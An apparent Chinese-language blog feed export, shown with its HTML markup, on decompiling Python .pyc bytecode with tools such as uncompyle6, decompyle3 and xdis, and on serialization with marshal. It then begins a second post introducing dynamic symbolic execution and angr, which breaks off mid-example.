class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">PyObject_HEADint co_argcount;        /* 位置参数个数 */</span><br><span class="line"><span class="built_in">int</span> co_nlocals;         /* 局部变量个数 */</span><br><span class="line"><span class="built_in">int</span> co_stacksize;       /* 栈大小 */</span><br><span class="line"><span class="built_in">int</span> co_flags;PyObjectco_code;      /字节码指令序列 */</span><br><span class="line">PyObjectco_consts;    /所有常量集合 */</span><br><span class="line">PyObjectco_names;     /所有符号名称集合 */</span><br><span class="line">PyObjectco_varnames;  /局部变量名称集合 */</span><br><span class="line">PyObjectco_freevars;  /闭包用的的变量名集合 */</span><br><span class="line">PyObjectco_cellvars;  /内部嵌套函数引用的变量名集合 */</span><br><span class="line">/* The rest doesn’t count <span class="keyword">for</span> <span class="built_in">hash</span>/cmp */PyObjectco_filename;  /代码所在文件名 */</span><br><span class="line">PyObjectco_name;      /模块名|函数名|类名 */</span><br><span class="line"><span class="built_in">int</span> co_firstlineno;     /* 代码块在文件中的起始行号 */</span><br><span class="line">PyObjectco_lnotab;    /字节码指令和行号的对应关系 */</span><br><span class="line">voidco_zombieframe;   /<span class="keyword">for</span> optimization only (see frameobject.c) */</span><br><span class="line">&#125; PyCodeObject;</span><br></pre></td></tr></table></figure><h3 id="代码-pyc字节码"><a href="#代码-pyc字节码" class="headerlink" title="代码-&gt;pyc字节码"></a>代码-&gt;<strong>pyc字节码</strong></h3><p>字节码文件的扩展名通常以“.pyc”结尾，或“.pyo”</p><h4 id="1-compileall"><a href="#1-compileall" class="headerlink" title="1.compileall"></a>1.compileall</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m compileall test.py</span><br></pre></td></tr></table></figure><p>成功编译后会当前目录生成相应文件夹和文件</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">V PYTHONEX</span><br><span class="line">    v <span class="built_in">_</span>pycache</span><br><span class="line">        exercise.cpython-38.pyc</span><br></pre></td></tr></table></figure><p>现在我用的是3.8.18，所以用decompyle3和uncompyle6分别试试反编译</p><p>结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PS D: anquan_reandpwn \pythonex\pyctest&gt; decompyle3 exercise. cpython-38.pyc</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">decompyle3 version 3.9.1</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Python bytecode version base 3.8.0 (3413)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Decompiled from: Python 3.8.18 (default, Sep 11 2023, 13:39:12) [MSC v.1916 64 bit (AMD64)]</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Embedded file name: exercise.py</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Compiled at: 2024-07-22 21:25:42</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Size of <span class="built_in">source</span> mod 2 ** 32: 80 bytes</span></span><br><span class="line"></span><br><span class="line">def hello():</span><br><span class="line">    print(&quot;hello,hacker&quot;)</span><br><span class="line"></span><br><span class="line">if __main__ == &quot;__main__&quot;</span><br><span class="line">    hello()</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">okay decompiling exercise.cpython-38.pyc</span></span><br><span class="line">PS D:\anquan_reandpwn\pythonex\pyctest&gt;</span><br></pre></td></tr></table></figure><p>对于这些参数的解释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">以 # 开头是注释。顶部的部分包含一些元数据，这些元数据存储在字节码文件中。它不是我们之前在十六进制中看到的 25 字节指令序列的一部分(不是代码执行的一部分）</span><br><span class="line"></span><br><span class="line">Each bytecode has a unique number for the bytecode variant. Here, it is 3413, and this variant covers Python version 3.8.</span><br><span class="line">每个字节码都有一个字节码变体的唯一编号。这里是 3413，这个变体涵盖了 Python 3.8 版。</span><br><span class="line"></span><br><span class="line">Major releases of Python typically can alter the programming language and/or the bytecode, and/or the way the source text gets translated.</span><br><span class="line">Python 的主要版本通常可以更改编程语言和/或字节码，和/或源文本的翻译方式。</span><br><span class="line"></span><br><span class="line">反编译的文件名</span><br><span class="line"></span><br><span class="line">代码编写时间</span><br></pre></td></tr></table></figure><p>我没下载相对应的uncomply6版本，就不演示了</p><h4 id="2-dis库（disassember-）："><a href="#2-dis库（disassember-）：" class="headerlink" title="2.dis库（disassember ）："></a>2.dis库（disassember ）：</h4><p>There is a disassember in the standard Python Library called <em>dis</em>. Most novice decompilers use this— it’s the first thing that comes to mind. But that has some serious limitations. The biggest limitation is that it can only disassemble code for a single Python version, the version that is runining the decompiler. If you are running the latest version of Python, such 3.12, but the bytecode you want to analyze is from an earlier version, like bytecode from 2.7, then you are out of luck. Malware written in Python tends to use older versions of Python. This was the situation when Microsoft folks contacted me.<br>在标准 Python 库中有一个名为 disassember 的dis。大多数新手反编译器都使用它——这是首先想到的。但这有一些严重的局限性。最大的限制是它只能反汇编单个 Python 版本的代码，即运行反编译器的版本。如果您运行的是最新版本的 Python，例如 3.12，但要分析的字节码来自早期版本，例如 2.7 的字节码，那么您就不走运了。用 Python 编写的恶意软件倾向于使用旧版本的 Python。当Microsoft的人联系我时，情况就是这样</p><p>显示字节码的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line">dis.dis(you_function)</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">python -m dis xxx.py</span><br></pre></td></tr></table></figure><h3 id="pyc字节码-代码"><a href="#pyc字节码-代码" class="headerlink" title="pyc字节码-&gt;代码"></a>pyc字节码-&gt;代码</h3><h4 id="uncompyle6的详细介绍"><a href="#uncompyle6的详细介绍" class="headerlink" title="uncompyle6的详细介绍"></a><strong>uncompyle6的详细介绍</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install uncompyle6</span><br><span class="line">uncompyle6 -o output_file.py your_file.pyc-o </span><br><span class="line">目标生成的Python文件名 原pyc文件名</span><br></pre></td></tr></table></figure><p>uncompyle6的工作原理:</p><ol><li><p>Get bytecode disassembly using <em><a class="link"   href="https://pypi.org/project/xdis" >xdis<i class="fas fa-external-link-alt"></i></a></em>. <em>xdis</em> is the cross-version disassembly library that I wrote to be able to support these decompilers. It is also useful in other projects that work with Python bytecode.<br>使用 xdis 获取字节码反汇编。xdis 是我（uncompyle6作者，这段文字复制于原文）编写的跨版本反汇编库，以便能够支持这些反编译器。它在使用 Python 字节码的其他项目中也很有用。</p></li><li><p>“ Tokenize” the disassembly. “Tokenize” is a compiler-centric term. In other decompilers and code-analysis tools, this process is sometimes called <em>lifting</em>, as in “lifting the disassembly” or “lifting the machine code”.<br>“标记化”反汇编。“Tokenize”是一个以编译器为中心的术语。在其他反编译器和代码分析工具中，此过程有时称为提升，如“提升反汇编”或“提升机器代码”。</p></li><li><p>Parse tokens to create a Parse Tree.<br>解析令牌以创建解析树。</p></li><li><p>Abstract the parse tree to an “Abstract Syntax Tree”, and finally:<br>将解析树抽象为“抽象语法树”，最后：</p></li><li><p>Produce Python source text from the Abstract Syntax Tree.<br>从抽象语法树生成 Python 源文本。</p></li></ol><p>在机器代码中，操作数通常是寄存器值，可以是数字、地址或地址的一部分。在 Python 字节码中，操作数是任意的 Python 对象！</p><h5 id="xdis"><a href="#xdis" class="headerlink" title="xdis"></a>xdis</h5><p><a class="link"   href="https://pypi.org/project/xdis/" >https://pypi.org/project/xdis/<i class="fas fa-external-link-alt"></i></a></p><p>uncompyle6 和 decompile3 使用 xdis——“跨 Python 反汇编器”。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pip install xdis</span><br><span class="line">pydisasm -F extended-<span class="built_in">bytes</span> -S test.pyc</span><br><span class="line"></span><br><span class="line">-F extended-<span class="built_in">bytes</span>：指定输出格式为扩展字节码</span><br><span class="line">-S：显示源代码和对应的字节码</span><br><span class="line"> -F, --<span class="built_in">format</span> [xasm|<span class="built_in">bytes</span>|classic|dis|extended|extended-<span class="built_in">bytes</span>|header]</span><br><span class="line">                                  Select disassembly style</span><br><span class="line"> -S, --show-source / --no-show-source</span><br><span class="line">                                  Intersperse Python source text <span class="keyword">from</span> linecache <span class="keyword">if</span> available.</span><br><span class="line"> --version                       Show the version <span class="keyword">and</span> exit.</span><br><span class="line"> --<span class="built_in">help</span>                          Show this message <span class="keyword">and</span> exit.</span><br></pre></td></tr></table></figure><p>结果如下（如果你看了前面的文章链接，就会发现我这里生成的数据和作者的不一样，也许是版本原因，我使用的是python3.8.18,xdis使用的是6.1.1）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">$pydisasm -F extended-<span class="built_in">bytes</span> -S exercise.cpython-<span class="number">38.</span>pyc  </span><br><span class="line"></span><br><span class="line"><span class="comment"># pydisasm version 6.1.1</span></span><br><span class="line"><span class="comment"># Python bytecode 3.8.0 (3413)</span></span><br><span class="line"><span class="comment"># Disassembled from Python 3.8.18 (default, Sep 11 2023, 13:39:12) [MSC v.1916 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Timestamp in code: 1721654742 (2024-07-22 21:25:42)</span></span><br><span class="line"><span class="comment"># Source code size mod 2**32: 80 bytes</span></span><br><span class="line"><span class="comment"># Method Name:       &lt;module&gt;</span></span><br><span class="line"><span class="comment"># Filename:          exercise.py</span></span><br><span class="line"><span class="comment"># Argument count:    0</span></span><br><span class="line"><span class="comment"># Position-only argument count: 0</span></span><br><span class="line"><span class="comment"># Keyword-only arguments: 0</span></span><br><span class="line"><span class="comment"># Number of locals:  0</span></span><br><span class="line"><span class="comment"># Stack size:        2</span></span><br><span class="line"><span class="comment"># Flags:             0x00000040 (NOFREE)</span></span><br><span class="line"><span class="comment"># First Line:        1</span></span><br><span class="line"><span class="comment"># Constants:</span></span><br><span class="line"><span class="comment">#    0: &lt;code object hello at 0x00000201695ABD40, file &quot;exercise.py&quot;, line 1&gt;</span></span><br><span class="line"><span class="comment">#    1: &#x27;hello&#x27;</span></span><br><span class="line"><span class="comment">#    2: &#x27;__main__&#x27;</span></span><br><span class="line"><span class="comment">#    3: None</span></span><br><span class="line"><span class="comment"># Names:</span></span><br><span class="line"><span class="comment">#    0: hello</span></span><br><span class="line"><span class="comment">#    1: __name__</span></span><br><span class="line">  <span class="number">1</span>:           <span class="number">0</span> |<span class="number">64</span> <span class="number">00</span>| LOAD_CONST           (&lt;code <span class="built_in">object</span> hello at <span class="number">0x00000201695ABD40</span>, file <span class="string">&quot;exercise.py&quot;</span>, line <span class="number">1</span>&gt;) ; TOS = &lt;code <span class="built_in">object</span> hello at <span class="number">0x00000201695ABD40</span>, file <span class="string">&quot;exercise.py&quot;</span>, line <span class="number">1</span>&gt;</span><br><span class="line">               <span class="number">2</span> |<span class="number">64</span> 01| LOAD_CONST           (<span class="string">&quot;hello&quot;</span>) ; TOS = <span class="string">&quot;hello&quot;</span></span><br><span class="line">               <span class="number">4</span> |<span class="number">84</span> <span class="number">00</span>| MAKE_FUNCTION        (No arguments) ; TOS = <span class="keyword">def</span> <span class="title function_">hello</span>(): ...</span><br><span class="line">               <span class="number">6</span> |5a <span class="number">00</span>| STORE_NAME           (hello) ; hello = <span class="keyword">def</span> <span class="title function_">hello</span>(): ...</span><br><span class="line"></span><br><span class="line">  <span class="number">4</span>:           <span class="number">8</span> |<span class="number">65</span> 01| LOAD_NAME            (__name__) ; TOS = __name__</span><br><span class="line">              <span class="number">10</span> |<span class="number">64</span> 02| LOAD_CONST           (<span class="string">&quot;__main__&quot;</span>) ; TOS = <span class="string">&quot;__main__&quot;</span></span><br><span class="line">              <span class="number">12</span> |6b 02| COMPARE_OP           (==) ; TOS = __name__ == (<span class="string">&quot;__main__&quot;</span>)</span><br><span class="line">              <span class="number">14</span> |<span class="number">72</span> <span class="number">16</span>| POP_JUMP_IF_FALSE    (to <span class="number">22</span>)</span><br><span class="line"></span><br><span class="line">  <span class="number">5</span>:          <span class="number">16</span> |<span class="number">65</span> <span class="number">00</span>| LOAD_NAME            (hello) ; TOS = hello</span><br><span class="line">              <span class="number">18</span> |<span class="number">83</span> <span class="number">00</span>| CALL_FUNCTION        (<span class="number">0</span> positional arguments) ; TOS = hello()</span><br><span class="line">              <span class="number">20</span> |01 <span class="number">00</span>| POP_TOP</span><br><span class="line">         &gt;&gt;   <span class="number">22</span> |<span class="number">64</span> 03| LOAD_CONST           (<span class="literal">None</span>) ; TOS = <span class="literal">None</span></span><br><span class="line">              <span class="number">24</span> |<span class="number">53</span> <span class="number">00</span>| RETURN_VALUE         <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Method Name:       hello</span></span><br><span class="line"><span class="comment"># Filename:          exercise.py</span></span><br><span class="line"><span class="comment"># Argument count:    0</span></span><br><span class="line"><span class="comment"># Position-only argument count: 0</span></span><br><span class="line"><span class="comment"># Keyword-only arguments: 0</span></span><br><span class="line"><span class="comment"># Number of locals:  0</span></span><br><span class="line"><span class="comment"># Stack size:        2</span></span><br><span class="line"><span class="comment"># Flags:             0x00000043 (NOFREE | NEWLOCALS | OPTIMIZED)</span></span><br><span class="line"><span class="comment"># First Line:        1</span></span><br><span class="line"><span class="comment"># Constants:</span></span><br><span class="line"><span class="comment">#    0: None</span></span><br><span class="line"><span class="comment">#    1: &#x27;hello,hacker&#x27;</span></span><br><span class="line"><span class="comment"># Names:</span></span><br><span class="line"><span class="comment">#    0: print</span></span><br><span class="line">  <span class="number">2</span>:           <span class="number">0</span> |<span class="number">74</span> <span class="number">00</span>| LOAD_GLOBAL          (<span class="built_in">print</span>) ; TOS = <span class="built_in">print</span></span><br><span class="line">               <span class="number">2</span> |<span class="number">64</span> 01| LOAD_CONST           (<span class="string">&quot;hello,hacker&quot;</span>) ; TOS = <span class="string">&quot;hello,hacker&quot;</span></span><br><span class="line">               <span class="number">4</span> |<span class="number">83</span> 01| CALL_FUNCTION        (<span class="number">1</span> positional argument) ; TOS = <span class="built_in">print</span>(<span class="string">&quot;hello,hacker&quot;</span>)</span><br><span class="line">               <span class="number">6</span> |01 <span class="number">00</span>| POP_TOP</span><br><span class="line">               <span class="number">8</span> |<span class="number">64</span> <span class="number">00</span>| LOAD_CONST           (<span class="literal">None</span>) ; TOS = <span class="literal">None</span></span><br><span class="line">              <span class="number">10</span> |<span class="number">53</span> <span class="number">00</span>| RETURN_VALUE         <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="pycdc"><a href="#pycdc" class="headerlink" title="pycdc"></a><strong>pycdc</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/extremecoders-re/decompyle-builds</span><br><span class="line">pycdc -o output_file.py your_file.pyc</span><br></pre></td></tr></table></figure><h4 id="decompyle3"><a href="#decompyle3" class="headerlink" title="decompyle3"></a><strong>decompyle3</strong></h4><p>它只处理 Python 3.7 和 3.8。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install decompyle3</span><br><span class="line"> decompyle3 *compiled-python-file-pyc-<span class="keyword">or</span>-pyo*</span><br></pre></td></tr></table></figure><h2 id="加花的pyc"><a href="#加花的pyc" class="headerlink" title="加花的pyc"></a>加花的pyc</h2><h2 id="Python-字节码控制流分析"><a href="#Python-字节码控制流分析" class="headerlink" title="Python 字节码控制流分析"></a>Python 字节码控制流分析</h2><p>Python control_flow</p><h2 id="python序列化和反序列化"><a href="#python序列化和反序列化" class="headerlink" title="python序列化和反序列化"></a>python序列化和反序列化</h2><h3 id="marshal-读写pyc字节码"><a href="#marshal-读写pyc字节码" class="headerlink" title="marshal(读写pyc字节码):"></a>marshal(读写pyc字节码):</h3><p><code>marshal</code> 模块是 Python 内置的一个模块，用于在二进制格式和 Python 对象之间进行序列化和反序列化。与 <code>pickle</code> 模块不同，<code>marshal</code> 模块主要用于处理 Python 字节码，并且不保证跨 Python 版本的兼容性。通常，<code>marshal</code> 用于读写 <code>.pyc</code> 文件中的字节码。</p><p><code>marshal</code> 模块的常用函数</p><ol><li><p>**<code>marshal.dump</code>**：将 Python 对象序列化到文件中。</p></li><li><p>**<code>marshal.load</code>**：从文件中反序列化 Python 对象。</p></li><li><p>**<code>marshal.dumps</code>**：将 Python 对象序列化为二进制数据。</p></li><li><p>**<code>marshal.loads</code>**：将二进制数据反序列化为 Python 对象</p></li></ol><p>利用示范</p><p>对象和文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将对象序列化到文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.marshal&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    marshal.dump(data, f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从文件反序列化对象</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.marshal&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = marshal.load(f)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data)  <span class="comment"># 输出: &#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2, &#x27;c&#x27;: 3&#125;</span></span><br></pre></td></tr></table></figure><p>对象和二进制数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将对象序列化为二进制数据</span></span><br><span class="line">binary_data = marshal.dumps(data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(binary_data)  <span class="comment"># 输出: 二进制数据</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#从二进制数据反序列化对象</span></span><br><span class="line">data=marshal.loads(binary_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参照此文章编写&lt;a class=&quot;link&quot;   href=&quot;https://rocky.github.io/blackhat-asia-2024-additional/all-notes-print&quot; &gt;https://rocky.github.io/blackhat-a</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>动态符号执行</title>
    <link href="http://arch3rn4r.github.io/2024/09/18/%E5%8A%A8%E6%80%81%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    <id>http://arch3rn4r.github.io/2024/09/18/%E5%8A%A8%E6%80%81%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/</id>
    <published>2024-09-18T12:51:10.000Z</published>
    <updated>2025-05-02T02:41:59.318Z</updated>
    
    <content type="html"><![CDATA[<h2 id="初始概念介绍"><a href="#初始概念介绍" class="headerlink" title="初始概念介绍"></a>初始概念介绍</h2><p>动态符号执行的核心思想是在所谓的符号数据域上模拟程序执行</p><p>cpu工作在1和0上，如果使用read系统调用读入用户输入，得到的是1和0.作为发送程序的人，无法给它发送一个未知值的变量，但是可以创造一个模拟器来实现它，可以是0，1或者x.随着知道已知数据是什么，未知数据是什么，根据cmp比较未知数据，并基于结果进行跳转</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov rax, <span class="number">0</span>  &gt; rax = <span class="number">0</span></span><br><span class="line">mov rdi, <span class="number">0</span>  &gt;rax = <span class="number">0</span>, rdi = <span class="number">0</span></span><br><span class="line">mov rdx, <span class="number">1</span>  &gt; rax = <span class="number">0</span>, rdi = <span class="number">0</span>, rdx = <span class="number">1</span></span><br><span class="line">syscall -   &gt;rax = <span class="number">0</span>, rdi = <span class="number">0</span>, rdx = <span class="number">1</span>, [rsi] = user_input</span><br><span class="line">cmp qword ptr [rsi], <span class="number">42</span>   &gt;rax = <span class="number">0</span>, rdi = <span class="number">0</span>, rdx = <span class="number">1</span>, [rsi] = user_input, user_input == <span class="number">42</span>?</span><br><span class="line">je .get_flag</span><br></pre></td></tr></table></figure><p>就可以创造出一个公式，描述程序的行为，获得程序的输入、检查条件和持续输出之间的关系</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(user_inp(user_input == <span class="number">42</span> AND program_output == the_flag) OR</span><br><span class="line">(user input != <span class="number">42</span> AND program output == <span class="string">&quot;INCORRECT&quot;</span>)ut == <span class="number">42</span> AND program_output == the_flag) OR(user input != <span class="number">42</span> AND program output == <span class="string">&quot;INCORRECT&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后加上一些约束关系，就可以得到有效答案</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">    (user_input == <span class="number">42</span> AND program_output == the_flag) OR</span><br><span class="line">    (user_input != <span class="number">42</span> AND program_output == <span class="string">&quot;INCORRECT&quot;</span>)  &gt;user_input == <span class="number">42</span></span><br><span class="line">) AND (program_output != <span class="string">&quot;INCORRECT&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>现代的动态符号执行会模拟代码，转化为数据公式</p><p>符号执行必须像普通CPU一样按顺序执行代码，不过它有一个可修改的模拟状态。</p><p>在它执行程序时，每当遇到分支，模拟器就会多分出一个内部状态，一个状态根据条件进入一个分支，而另一个不会进入同一个分支。当这些状态分离后它们的行为就不一样了，</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240918/1280X1280.1aoye6yk1p.webp"                                        ></p><h2 id="angr"><a href="#angr" class="headerlink" title="angr"></a>angr</h2><p>一些其他工具</p><blockquote><p><strong>angr:</strong> our binary analysis framework that does (among other things) symboli</p><p>execution.</p><p><strong>miasm:</strong> another binary analysis framework that does symbolic execution.</p><p><strong>s2e:</strong> another binary analysis framework that does symbolic execution.</p><p><strong>manticore:</strong> another binary analysis framework that does symbolic execution.</p><p><strong>klee:</strong> symbolic execution on source code.</p></blockquote><p><strong>angr 安装</strong>（加个镜像源安装更快）</p><p><a class="link"   href="https://github.com/angr/angr" >https://github.com/angr/angr<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install angr -i https:<span class="comment">//pypi.tuna.tsinghua.edu.cn/simple</span></span><br></pre></td></tr></table></figure><p><code>angr</code> 依赖于 <code>pycparser</code> 来解析 C 代码。如果没有安装 <code>pycparser</code>，就会出现错误。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pycparser -i https:<span class="comment">//pypi.tuna.tsinghua.edu.cn/simple</span></span><br></pre></td></tr></table></figure><p>如果还有报错，就尝试更新</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade pycparser</span><br></pre></td></tr></table></figure><p><strong>angr基本使用</strong></p><p>使用的测试代码 do.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1024</span>];</span><br><span class="line">    read(<span class="number">0</span>, buffer, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (buffer[<span class="number">0</span>] == <span class="number">42</span>)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Failure!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//angr有项目的概念，基本就是打开二进制程序以及他用的所有库</span></span><br><span class="line">In [<span class="number">1</span>]: import angr</span><br><span 